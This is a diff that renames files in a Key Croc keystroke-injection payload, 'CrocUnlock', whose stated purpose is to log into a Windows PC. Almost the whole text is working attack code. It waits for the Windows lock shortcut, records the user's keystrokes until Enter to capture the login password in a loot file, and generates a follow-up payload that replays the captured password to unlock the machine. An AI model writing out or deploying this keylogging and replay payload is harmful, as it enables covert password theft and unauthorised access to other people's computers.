@@ -1,4 +1,4 @@
-# Title:           KeyCroc_Unlocker   
+# Title:           CrocUnlock   
 # Description:     Log into windows pc
 # Author:          spywill / RootJunky
 # Version:         1.2
@@ -7,12 +7,12 @@
 #
 MATCH GUI-l
 LED ATTACK
-rm -f -r root/udisk/payloads/Croc_unlocker_2.txt root/udisk/loot/Croc_unlocker_2.txt 
+rm -f -r root/udisk/payloads/Croc_unlock_2.txt root/udisk/loot/Croc_unlock.txt 
 sleep 2
-echo \M\A\T\C\H crocunlock >> /root/udisk/payloads/Croc_unlocker_2.txt
-echo -e "LED ATTACK\nQ CONTROL-SHIFT-LEFTARROW\nQ DELETE\nQ STRING \"\$(sed '\$!d' root/udisk/loot/Croc_unlocker.txt.filtered)\"\nQ ENTER\nLED FINISH\nsleep 2\nLED OFF" >> /root/udisk/payloads/Croc_unlocker_2.txt
+echo \M\A\T\C\H crocunlock >> /root/udisk/payloads/Croc_unlock_2.txt
+echo -e "LED ATTACK\nQ CONTROL-SHIFT-LEFTARROW\nQ DELETE\nQ STRING \"\$(sed '\$!d' root/udisk/loot/Croc_unlock.txt.filtered)\"\nQ ENTER\nLED FINISH\nsleep 2\nLED OFF" >> /root/udisk/payloads/Croc_unlock_2.txt
 sleep 2
-SAVEKEYS /root/udisk/loot/Croc_unlocker.txt UNTIL ENTER
+SAVEKEYS /root/udisk/loot/Croc_unlock.txt UNTIL ENTER
 LED FINISH
 sleep 2
 LED OFF
